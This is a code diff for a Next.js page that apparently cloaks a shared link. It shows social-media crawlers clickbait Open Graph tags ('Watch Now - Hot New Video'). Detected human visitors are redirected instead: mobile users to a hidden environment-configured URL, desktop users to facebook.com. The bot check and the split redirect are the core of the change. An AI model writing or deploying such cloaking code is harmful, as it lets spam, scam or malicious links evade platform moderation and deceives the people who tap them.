@@ -1,23 +1,52 @@
 // app/page.tsx
-import { headers } from "next/headers";
-import { redirect } from "next/navigation";
+"use client";
+
+import { useEffect } from "react";
 
 export default function Home() {
-  const headersList = headers();
-  const userAgent = headersList.get("user-agent") || "";
+  useEffect(() => {
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isBot =
+      userAgent.includes("facebook") ||
+      userAgent.includes("twitter") ||
+      userAgent.includes("linkedin") ||
+      userAgent.includes("discord") ||
+      userAgent.includes("bot");
 
-  const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(
-    userAgent,
+    const isMobile = /iphone|ipad|android|blackberry|iemobile|opera mini/.test(
+      userAgent,
+    );
+
+    if (!isBot) {
+      if (isMobile) {
+        window.location.href = process.env.MOBILE_REDIRECT_URL;
+      } else {
+        window.location.href = "https://facebook.com";
+      }
+    }
+  }, []);
+
+  return (
+    <>
+      <title>My Facebook Preview Page</title>
+      <meta property="og:title" content="Watch Now - Hot New Video" />
+      <meta property="og:description" content="Tap to watch the video now!" />
+      <meta
+        property="og:image"
+        content="https://my-app-crih.vercel.app/preview.jpeg"
+      />
+      <meta property="og:url" content="https://my-app-crih.vercel.app/" />
+      <meta property="og:type" content="website" />
+
+      <main style={{ padding: 40, textAlign: "center" }}>
+        <h1>Watch Now</h1>
+        <p>Redirecting...</p>
+        <img
+          src="/preview.jpg"
+          alt="preview"
+          style={{ width: "100%", maxWidth: 500 }}
+        />
+      </main>
+    </>
   );
-
-  const mobileLink =
-    process.env.MOBILE_REDIRECT_URL || "https://default-mobile.com";
-
-  if (isMobile) {
-    redirect(mobileLink); // ✅ Redirect mobile to dynamic link
-  } else {
-    redirect("https://facebook.com"); // ✅ Desktop opens Facebook
-  }
-
-  return null;
 }
